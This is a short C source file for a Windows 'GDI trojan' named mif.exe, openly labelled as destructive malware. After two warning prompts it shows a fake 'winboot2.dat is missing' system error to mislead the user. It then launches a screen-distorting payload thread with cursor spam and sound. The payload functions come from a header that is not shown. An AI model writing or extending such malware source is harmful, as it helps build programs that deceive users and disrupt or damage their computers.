typedef struct IUnknown IUnknown;

#include "mif.h"

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow)
{
	    if (GetFileAttributesW(L"C:\\WINDOWS\\winboot.dat") == INVALID_FILE_ATTRIBUTES) {
		if (MessageBoxW(NULL,
		L"MIF.EXE\n\nThis is a very destructive piece of malware that may wipe all your data beyond repair with no way of getting it back.\nComium97 and Drumstickguy are not responsible for any damages.\nExecute it?",
		L"GDI-Trojan.Win32.mif - WARNING #1",
		MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES) exit(0);
		
		if (MessageBoxW(NULL,
		L"FINAL WARNING!!\n\nIF YOU HAVEN\'T READ BY NOW, THIS HAS THE ABILITY TO DESTROY YOUR SYSTEM!\nANY DECISION YOU MAKE IS FINAL!\nEXECUTE IT?",
		L"GDI-Trojan.Win32.mif - WARNING #2",
		MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES) exit(0);
}
    Sleep(5000);

	// Error
//	if (GetFileAttributesW(L"C:\\WINDOWS\\winboot.dat") == INVALID_FILE_ATTRIBUTES)
	MessageBoxW(NULL, L"The program can't start because winboot2.dat is missing from your computer. Try reinstalling the program to fix this problem.", L"mif.exe - System Error", MB_OK | MB_ICONERROR);
	
	Sleep(5000);
	
	/* PROXIME PAYLOAD + RGBQUAD + CURSOR SPAM */
	Sound1();
	HANDLE hPXP = CreateThread(NULL, 0, ProximePayload, NULL, 0, 0); 
	Sleep(30000);
	EndPayload(hPXP);
	RedrawScreen();
	Sleep(100);


}
